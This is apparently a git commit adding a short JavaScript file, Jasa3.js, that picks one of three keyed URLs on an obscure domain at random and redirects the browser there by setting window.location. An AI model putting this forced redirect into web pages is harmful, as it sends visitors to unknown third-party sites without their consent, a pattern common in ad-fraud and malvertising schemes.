770d238b0e7fd62963d4a11856ee0ed64fbdb2eb
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2021-11-08 22:50:36 +0800

    Create Jasa3.js

---
+++ Jasa3.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+  
+  'https://3sk7d418al8u.com/x1rmkyiu?key=77b1f7a5e1bdd48c9089bd2f8ba1bb38',
+  'https://3sk7d418al8u.com/d5ptgezysu?key=f1d372e9d526612918ff413aff3e6582',
+  'https://3sk7d418al8u.com/hwbw93qp?key=4e6d7c976c1d98093bb35b9a0693426a' 
+  
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
